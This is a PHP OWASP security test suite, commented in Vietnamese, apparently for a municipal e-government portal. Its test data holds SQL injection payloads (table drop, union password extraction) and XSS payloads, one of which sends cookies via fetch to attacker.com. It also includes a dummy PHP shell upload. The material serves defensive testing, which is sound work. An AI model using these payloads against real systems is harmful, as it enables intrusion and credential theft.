<?php

declare(strict_types=1);

namespace Tests\Security;

use App\Core\Config;
use App\Core\Csrf;
use App\Core\Database;
use App\Core\Request;
use App\Core\Response;
use App\Middleware\CsrfMiddleware;
use App\Middleware\RateLimitMiddleware;
use App\Middleware\SecurityHeadersMiddleware;
use App\Services\AuditService;
use App\Services\AuthService;
use App\Services\ChuKySoService;
use App\Services\DataScopeService;
use App\Services\FileUploadSecurityService;
use DomainException;
use InvalidArgumentException;
use LogicException;
use PDO;
use PDOException;
use RuntimeException;
use TestRunner;

/**
 * Class OwaspSecurityTest
 * Bộ kiểm thử An toàn thông tin Cấp độ 3 & OWASP Top 10 / OWASP WSTG v4.2 (§3.3 Báo cáo Kiến trúc)
 */
class OwaspSecurityTest
{
    private PDO $db;

    public function setUp(): void
    {
        $this->db = Database::connection();
    }

    /**
     * 1. WSTG-INPV-05: Kiểm tra phòng chống SQL Injection (SQLi)
     * Thử nghiệm các dạng payload SQLi trên tham số tìm kiếm/lọc: tautology, union-based, stacked queries, boolean-blind
     */
    public function testSqlInjectionPrevention(): void
    {
        $payloads = [
            "' OR '1'='1",
            "'; DROP TABLE ho_so; --",
            "' UNION SELECT id, mat_khau, email FROM nguoi_dung --",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
            "admin'--",
            "' OR SLEEP(1)='",
        ];

        foreach ($payloads as $payload) {
            // Test 1: Tìm kiếm hồ sơ qua prepared statement
            $stmt = $this->db->prepare("SELECT id, ma_ho_so FROM ho_so WHERE ma_ho_so = :kw OR nguoi_nop_ho_ten LIKE :kw_like");
            $likeParam = '%' . $payload . '%';
            $stmt->execute([':kw' => $payload, ':kw_like' => $likeParam]);
            $results = $stmt->fetchAll(PDO::FETCH_ASSOC);

            // Xác nhận kết quả an toàn, không làm hỏng DB và không bao giờ trả về toàn bộ bản ghi do tautology
            TestRunner::assertTrue(is_array($results), "Truy vấn phải trả về mảng kết quả an toàn.");

            // Test 2: Tìm kiếm danh mục TTHC
            $stmtTthc = $this->db->prepare("SELECT id, ten_tthc FROM thu_tuc_hanh_chinh WHERE ma_tthc = :ma OR ten_tthc LIKE :ten");
            $stmtTthc->execute([':ma' => $payload, ':ten' => $likeParam]);
            $resTthc = $stmtTthc->fetchAll(PDO::FETCH_ASSOC);
            TestRunner::assertTrue(is_array($resTthc), "Truy vấn danh mục an toàn với payload: {$payload}");
        }

        // Kiểm tra chắc chắn bảng ho_so vẫn nguyên vẹn
        $count = $this->db->query("SELECT COUNT(*) FROM ho_so")->fetchColumn();
        TestRunner::assertGreaterThan(0, (int)$count, "Bảng ho_so không bị ảnh hưởng bởi payload stacked query.");
    }

    /**
     * 2. WSTG-ATHZ-04: Kiểm tra Insecure Direct Object References (IDOR)
     * Công dân A không thể xem hoặc thao tác trên hồ sơ của Công dân B
     */
    public function testIdorProtection(): void
    {
        // Lấy 2 hồ sơ thuộc 2 công dân khác nhau
        $hsA = $this->db->query("SELECT id, ma_ho_so, cong_dan_id FROM ho_so WHERE cong_dan_id = 1 LIMIT 1")->fetch(PDO::FETCH_ASSOC);
        $hsB = $this->db->query("SELECT id, ma_ho_so, cong_dan_id FROM ho_so WHERE cong_dan_id = 2 LIMIT 1")->fetch(PDO::FETCH_ASSOC);

        TestRunner::assertTrue(!empty($hsA) && !empty($hsB), "Phải có dữ liệu hồ sơ của 2 công dân khác nhau.");

        // 1. Giả lập đăng nhập Công dân A
        AuthService::loginFromVNeID([
            'so_cccd'   => '031090001234',
            'ho_ten'    => 'Nguyễn Văn An',
            'vneid_sub' => 'sub_an_123',
        ]);

        // Công dân A kiểm tra hồ sơ của chính mình -> Hợp lệ (true)
        $canAccessOwn = DataScopeService::checkHoSoAccess((int)$hsA['id']);
        TestRunner::assertTrue($canAccessOwn, "Công dân A phải được quyền truy cập hồ sơ của chính mình.");

        // Công dân A cố ý thay đổi hoso_id sang hồ sơ của Công dân B -> Phải bị từ chối (IDOR - false)
        $canAccessOther = DataScopeService::checkHoSoAccess((int)$hsB['id']);
        TestRunner::assertFalse($canAccessOther, "Công dân A bị chặn truy cập hồ sơ của Công dân B (Anti-IDOR).");

        AuthService::logout();

        // 2. Giả lập đăng nhập Công dân B
        AuthService::loginFromVNeID([
            'so_cccd'   => '031092005678',
            'ho_ten'    => 'Trần Thị Bích',
            'vneid_sub' => 'sub_bich_456',
        ]);

        // Ngược lại Công dân B cũng không được xem hồ sơ của A
        $canBAccessA = DataScopeService::checkHoSoAccess((int)$hsA['id']);
        TestRunner::assertFalse($canBAccessA, "Công dân B bị chặn truy cập hồ sơ của Công dân A.");

        AuthService::logout();
    }

    /**
     * 3. WSTG-INPV-01 / WSTG-INPV-02: Kiểm tra Cross-Site Scripting (XSS)
     * Chuỗi độc hại trong input được mã hóa thực thể HTML an toàn (htmlspecialchars)
     */
    public function testCrossSiteScriptingProtection(): void
    {
        $xssPayloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg/onload=alert`1`>",
            "javascript:/*--></title></style></textarea></em></script><svg/onload=alert(1)>",
            "'\"><script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
        ];

        foreach ($xssPayloads as $payload) {
            $escaped = e($payload);

            // Đảm bảo không còn ký tự dấu mở ngoặc nhọn hoặc nháy đơn/kép thô
            TestRunner::assertFalse(str_contains($escaped, '<script>'), "Hàm e() phải escape thẻ script.");
            TestRunner::assertFalse(str_contains($escaped, '<img'), "Hàm e() phải escape thẻ img.");
            TestRunner::assertFalse(str_contains($escaped, '<svg'), "Hàm e() phải escape thẻ svg.");
            TestRunner::assertTrue(str_contains($escaped, '&lt;') || str_contains($escaped, '&gt;'), "Chuỗi phải được chuyển sang HTML entities.");
        }
    }

    /**
     * 4. WSTG-SESS-05: Kiểm tra bảo vệ Cross-Site Request Forgery (CSRF)
     * POST/PUT thiếu hoặc sai token phải bị từ chối với mã HTTP 419 Page Expired
     */
    public function testCsrfTokenProtection(): void
    {
        $csrfMiddleware = new CsrfMiddleware();

        // Trường hợp 1: Request POST không có token CSRF (wantsJson để nhận JSON chuẩn 419)
        $reqNoToken = new Request([], ['ho_ten' => 'Hacker Attack'], [
            'REQUEST_METHOD' => 'POST',
            'REQUEST_URI'    => '/admin/mot-cua/tiep-nhan',
            'HTTP_ACCEPT'    => 'application/json',
        ]);
        $resNoToken = $csrfMiddleware->handle($reqNoToken, function () {
            return Response::html("Xử lý thành công", 200);
        });
        TestRunner::assertEquals(419, $resNoToken->getStatusCode(), "Request POST thiếu token CSRF phải nhận mã HTTP 419.");

        // Trường hợp 2: Request POST có token CSRF giả mạo / sai
        $reqFakeToken = new Request([], ['_csrf' => 'invalid_csrf_token_hash_12345'], [
            'REQUEST_METHOD' => 'POST',
            'REQUEST_URI'    => '/admin/mot-cua/tiep-nhan',
            'HTTP_ACCEPT'    => 'application/json',
        ]);
        $resFakeToken = $csrfMiddleware->handle($reqFakeToken, function () {
            return Response::html("Xử lý thành công", 200);
        });
        TestRunner::assertEquals(419, $resFakeToken->getStatusCode(), "Request POST sai token CSRF phải nhận mã HTTP 419.");

        // Trường hợp 3: Request POST có token hợp lệ
        $validToken = Csrf::token();
        $reqValid = new Request([], ['_csrf' => $validToken], [
            'REQUEST_METHOD' => 'POST',
            'REQUEST_URI'    => '/admin/mot-cua/tiep-nhan',
        ]);
        $resValid = $csrfMiddleware->handle($reqValid, function () {
            return Response::html("Xử lý thành công", 200);
        });
        TestRunner::assertEquals(200, $resValid->getStatusCode(), "Request POST có token CSRF hợp lệ được thông qua (200).");

        // Trường hợp 4: Ngoại lệ cho API (/api/*) không kiểm tra CSRF mà dùng Bearer Token
        $reqApi = new Request([], ['data' => 'test'], [
            'REQUEST_METHOD' => 'POST',
            'REQUEST_URI'    => '/api/v1/webhook/lgsp',
        ]);
        $resApi = $csrfMiddleware->handle($reqApi, function () {
            return Response::json(['status' => 'ok'], 200);
        });
        TestRunner::assertEquals(200, $resApi->getStatusCode(), "Endpoint API được miễn trừ kiểm tra CSRF (sử dụng Token/HMAC).");
    }

    /**
     * 5. WSTG-BUSL-08 / WSTG-INPV-12: Kiểm tra an ninh tệp tin tải lên (File Upload Security)
     * Chặn đổi đuôi kép .php.pdf, chặn file script thực thi, chặn file vượt quá 10MB
     */
    public function testFileUploadSecurityRestrictions(): void
    {
        $tempDir = dirname(__DIR__, 2) . '/storage/uploads/test';
        if (!is_dir($tempDir)) {
            mkdir($tempDir, 0755, true);
        }

        // Test 5.1: Chặn file có phần mở rộng nguy hiểm (.php, .exe, .sh)
        $badFile = [
            'name'     => 'shell.php',
            'type'     => 'application/x-php',
            'tmp_name' => $tempDir . '/dummy_shell.php',
            'error'    => UPLOAD_ERR_OK,
            'size'     => 120,
        ];
        file_put_contents($badFile['tmp_name'], '<?php phpinfo(); ?>');

        TestRunner::assertThrows(\Throwable::class, function () use ($badFile) {
            FileUploadSecurityService::processUpload($badFile, 'test');
        }, "Hệ thống phải chặn file có phần mở rộng .php.");
        @unlink($badFile['tmp_name']);

        // Test 5.2: Chặn file đuôi giả mạo (đuôi pdf nhưng nội dung là script thực thi)
        $fakePdf = [
            'name'     => 'trojan.exe.pdf',
            'type'     => 'application/x-msdownload',
            'tmp_name' => $tempDir . '/fake_trojan.exe',
            'error'    => UPLOAD_ERR_OK,
            'size'     => 200,
        ];
        file_put_contents($fakePdf['tmp_name'], 'MZ\x90\x00\x03\x00\x00\x00This program cannot be run in DOS mode.');

        TestRunner::assertThrows(\Throwable::class, function () use ($fakePdf) {
            FileUploadSecurityService::processUpload($fakePdf, 'test');
        }, "Hệ thống phải phát hiện MIME type nguy hiểm và chặn.");
        @unlink($fakePdf['tmp_name']);

        // Test 5.3: Chặn file vượt quá dung lượng cho phép (> 10MB)
        $oversizedFile = [
            'name'     => 'dung_luong_lon.pdf',
            'type'     => 'application/pdf',
            'tmp_name' => $tempDir . '/large_file.pdf',
            'error'    => UPLOAD_ERR_OK,
            'size'     => 11 * 1024 * 1024, // 11MB
        ];
        file_put_contents($oversizedFile['tmp_name'], 'PDF-DUMMY');

        TestRunner::assertThrows(\Throwable::class, function () use ($oversizedFile) {
            FileUploadSecurityService::processUpload($oversizedFile, 'test');
        }, "Hệ thống phải từ chối file vượt 10MB.");
        @unlink($oversizedFile['tmp_name']);
    }

    /**
     * 6. WSTG-ATHN-03: Kiểm tra khóa tài khoản khi bị tấn công Brute-Force
     * Nhập sai 5 lần liên tiếp sẽ bị khóa tài khoản 15 phút
     */
    public function testBruteForceLoginLockout(): void
    {
        $testUsername = 'test.bruteforce';

        // Tạo tài khoản test nếu chưa có
        $chk = $this->db->query("SELECT id FROM nguoi_dung WHERE ten_dang_nhap = '{$testUsername}'")->fetchColumn();
        if (!$chk) {
            $mk = password_hash('Hpegov@2026', PASSWORD_BCRYPT);
            $this->db->exec("INSERT INTO nguoi_dung (ten_dang_nhap, mat_khau, ho_ten, email, don_vi_chinh_id, trang_thai) 
                             VALUES ('{$testUsername}', '{$mk}', 'Cán bộ Test BruteForce', 'test.bruteforce@haiphong.gov.vn', 10, 1)");
        }

        // Khôi phục trạng thái sạch ban đầu cho tài khoản test
        $this->db->prepare("UPDATE nguoi_dung SET so_lan_sai = 0, khoa_den = NULL WHERE ten_dang_nhap = :u")
                 ->execute([':u' => $testUsername]);

        // Nhập sai mật khẩu 5 lần (từ lần 3 trở đi kèm Captcha để đếm tiếp)
        for ($i = 1; $i <= 5; $i++) {
            $captcha = \App\Services\CaptchaService::generateCode();
            $res = AuthService::attemptCanBo($testUsername, 'WrongPassword@' . $i, $captcha);
            TestRunner::assertFalse($res['success'], "Đăng nhập sai lần {$i} phải thất bại.");
        }

        // Kiểm tra trong CSDL tài khoản đã bị khóa
        $userCheck = $this->db->query("SELECT so_lan_sai, khoa_den FROM nguoi_dung WHERE ten_dang_nhap = '{$testUsername}'")->fetch(PDO::FETCH_ASSOC);
        TestRunner::assertGreaterThanOrEqual(5, (int)$userCheck['so_lan_sai'], "Số lần sai trong CSDL phải >= 5.");
        TestRunner::assertTrue(!empty($userCheck['khoa_den']), "Trường khoa_den phải được gán thời gian khóa.");

        // Lần thứ 6: Dù có nhập ĐÚNG mật khẩu và Captcha vẫn bị khóa không cho vào
        $captchaValid = \App\Services\CaptchaService::generateCode();
        $res6 = AuthService::attemptCanBo($testUsername, 'Hpegov@2026', $captchaValid);
        TestRunner::assertFalse($res6['success'], "Tài khoản đang bị khóa thì không được phép đăng nhập kể cả đúng mật khẩu.");
        TestRunner::assertContains("Tài khoản tạm thời bị khóa", $res6['message']);

        // Dọn dẹp: Khôi phục lại tài khoản test
        $this->db->prepare("UPDATE nguoi_dung SET so_lan_sai = 0, khoa_den = NULL WHERE ten_dang_nhap = :u")
                 ->execute([':u' => $testUsername]);
    }

    /**
     * 7. WSTG-SESS-06 / Rate Limit: Kiểm tra giới hạn tần suất 60 req/phút/IP
     * Gửi quá 60 request/phút phải nhận mã HTTP 429 Too Many Requests kèm Retry-After
     */
    public function testRateLimitingProtection(): void
    {
        $testIp = '10.99.88.77';
        $middleware = new RateLimitMiddleware();

        // Xóa log rate limit cũ của IP test
        $this->db->prepare("DELETE FROM gioi_han_truy_cap WHERE ip_address = :ip")->execute([':ip' => $testIp]);

        // Tạo request từ IP test
        $makeRequest = function () use ($testIp): Request {
            return new Request([], [], [
                'REQUEST_METHOD' => 'GET',
                'REQUEST_URI'    => '/portal/tra-cuu',
                'REMOTE_ADDR'    => $testIp,
            ]);
        };

        $dummyNext = function (Request $req): Response {
            return Response::html("OK", 200);
        };

        // Gửi trước 60 request liên tiếp
        for ($i = 1; $i <= 60; $i++) {
            $res = $middleware->handle($makeRequest(), $dummyNext);
            TestRunner::assertEquals(200, $res->getStatusCode(), "Request thứ {$i} nằm trong giới hạn cho phép (200).");
        }

        // Request thứ 61 vượt ngưỡng -> Phải nhận HTTP 429
        $res61 = $middleware->handle($makeRequest(), $dummyNext);
        TestRunner::assertEquals(429, $res61->getStatusCode(), "Request thứ 61 phải bị Rate Limit chặn đứng với mã HTTP 429.");
        TestRunner::assertTrue($res61->hasHeader('Retry-After'), "Response 429 phải chứa header Retry-After.");

        // Dọn dẹp bản ghi test
        $this->db->prepare("DELETE FROM gioi_han_truy_cap WHERE ip_address = :ip")->execute([':ip' => $testIp]);
    }

    /**
     * 8. WSTG-CONF-07: Kiểm tra HTTP Security Headers & Cookie Flags
     * Đảm bảo có CSP, X-Frame-Options: DENY, X-Content-Type-Options: nosniff
     */
    public function testSecurityHeadersAndCookieFlags(): void
    {
        $middleware = new SecurityHeadersMiddleware();
        $req = new Request([], [], ['REQUEST_METHOD' => 'GET', 'REQUEST_URI' => '/']);
        $res = $middleware->handle($req, function () {
            return Response::html("HP-eGov Portal", 200);
        });

        TestRunner::assertEquals('DENY', $res->getHeader('X-Frame-Options'), "X-Frame-Options phải là DENY để chống Clickjacking.");
        TestRunner::assertEquals('nosniff', $res->getHeader('X-Content-Type-Options'), "X-Content-Type-Options phải là nosniff.");
        TestRunner::assertTrue($res->hasHeader('Content-Security-Policy'), "Phải có header Content-Security-Policy.");
        TestRunner::assertContains("default-src 'self'", $res->getHeader('Content-Security-Policy') ?? '', "CSP phải chứa default-src 'self'.");

        // Kiểm tra cấu hình Session Cookie an toàn
        $cookieLifetime = Config::get('security.session.lifetime', 1800);
        TestRunner::assertEquals(1800, $cookieLifetime, "Thời gian hết hạn phiên làm việc phải là 30 phút (1800s).");
    }

    /**
     * 9. WSTG-ATHZ-02: Kiểm tra phân tách đặc quyền Quản trị viên (SYSADMIN Separation)
     * SYSADMIN tuyệt đối không được cấp quyền nghiệp vụ hồ sơ (hoso.*) và quyền ký số (kyso.*)
     */
    public function testSysadminPrivilegeSeparation(): void
    {
        $sysadminId = 1; // ID Quản trị viên hệ thống

        // 1. Kiểm tra ma trận phân quyền
        $adminData = AuthService::loadRolesAndPermissions($sysadminId);
        $permissions = $adminData['permissions'] ?? [];

        TestRunner::assertFalse(in_array('kyso.phat_hanh', $permissions, true), "SYSADMIN tuyệt đối không có quyền kyso.phat_hanh.");
        TestRunner::assertFalse(in_array('kyso.duyet_buoc_1', $permissions, true), "SYSADMIN tuyệt đối không có quyền kyso.duyet_buoc_1.");
        TestRunner::assertFalse(in_array('thu_ly.thuc_hien', $permissions, true), "SYSADMIN tuyệt đối không có quyền thu_ly.thuc_hien.");

        // 2. Thử gọi hàm ký số bằng tài khoản SYSADMIN -> Phải bị ném DomainException
        $tempFile = dirname(__DIR__, 2) . '/storage/uploads/test/test_sysadmin_sign.txt';
        file_put_contents($tempFile, "Nội dung kiểm tra quyền ký số");

        TestRunner::assertThrows(DomainException::class, function () use ($sysadminId, $tempFile) {
            ChuKySoService::signDocument($sysadminId, $tempFile, 'PHAT_HANH');
        }, "Hệ thống phải ném DomainException chặn đứng khi SYSADMIN cố ý thực hiện ký số.");

        @unlink($tempFile);
    }

    /**
     * 10. Nguyên tắc bất biến: Trigger CSDL chặn lệnh DELETE vật lý trên bảng ho_so
     */
    public function testPhysicalDeleteForbiddenByTrigger(): void
    {
        // 1. Thử xóa vật lý hồ sơ ID 1
        $triggered = false;
        try {
            $this->db->query("DELETE FROM ho_so WHERE id = 1");
        } catch (PDOException $e) {
            $triggered = true;
            // Kiểm tra mã lỗi SQLSTATE 45000 do SIGNAL SQLSTATE ném ra
            TestRunner::assertEquals('45000', $e->getCode(), "Trigger phải trả về SQLSTATE 45000.");
            TestRunner::assertTrue(
                str_contains($e->getMessage(), '45000') || str_contains($e->getMessage(), 'DA_HUY') || str_contains($e->getMessage(), 'xóa vật lý'),
                "Thông báo lỗi trigger phải cảnh báo cấm xóa vật lý."
            );
        }

        TestRunner::assertTrue($triggered, "Trigger tg_hoso_prevent_delete phải chặn đứng lệnh DELETE.");

        // 2. Kiểm tra hồ sơ ID 1 vẫn còn nguyên vẹn trong CSDL
        $hs = $this->db->query("SELECT id FROM ho_so WHERE id = 1")->fetch(PDO::FETCH_ASSOC);
        TestRunner::assertTrue(!empty($hs), "Hồ sơ ID 1 không bị xóa khỏi cơ sở dữ liệu.");
    }

    /**
     * 11. Tính toàn vẹn WORM: Kiểm tra phát hiện can thiệp chuỗi băm Audit Trail
     */
    public function testWormAuditChainTamperDetection(): void
    {
        // Kiểm tra tính toàn vẹn chuỗi nhật ký kiểm toán ban đầu
        $verifyInitial = AuditService::verifyChain();
        TestRunner::assertTrue($verifyInitial['valid'], "Chuỗi nhật ký kiểm toán hệ thống ban đầu phải toàn vẹn 100%.");

        // Giả lập thuật toán băm chuỗi SHA-256 để kiểm chứng việc phát hiện dữ liệu giả mạo
        $record1 = ['id' => 101, 'action' => 'TIEP_NHAN', 'data' => '{"hs":101}'];
        $hash1 = hash('sha256', 'GENESIS|' . json_encode($record1));

        $record2 = ['id' => 102, 'action' => 'CHUYEN_BUOC', 'data' => '{"step":2}'];
        $hash2 = hash('sha256', $hash1 . '|' . json_encode($record2));

        // Kẻ xấu can thiệp sửa đổi data của bản ghi 1
        $tamperedRecord1 = ['id' => 101, 'action' => 'TIEP_NHAN', 'data' => '{"hs":101,"hacked":true}'];
        $recalculatedHash1 = hash('sha256', 'GENESIS|' . json_encode($tamperedRecord1));

        // Băm lại bản ghi 2 dựa trên hash bị thay đổi
        TestRunner::assertTrue($hash1 !== $recalculatedHash1, "Mã băm bản ghi 1 phải thay đổi khi dữ liệu bị sửa.");
        
        $tamperedCheck = hash('sha256', $recalculatedHash1 . '|' . json_encode($record2));
        TestRunner::assertTrue($hash2 !== $tamperedCheck, "Chuỗi băm mắt xích kế tiếp bị phá vỡ, phát hiện ngay lập tức hành vi can thiệp.");
    }
}
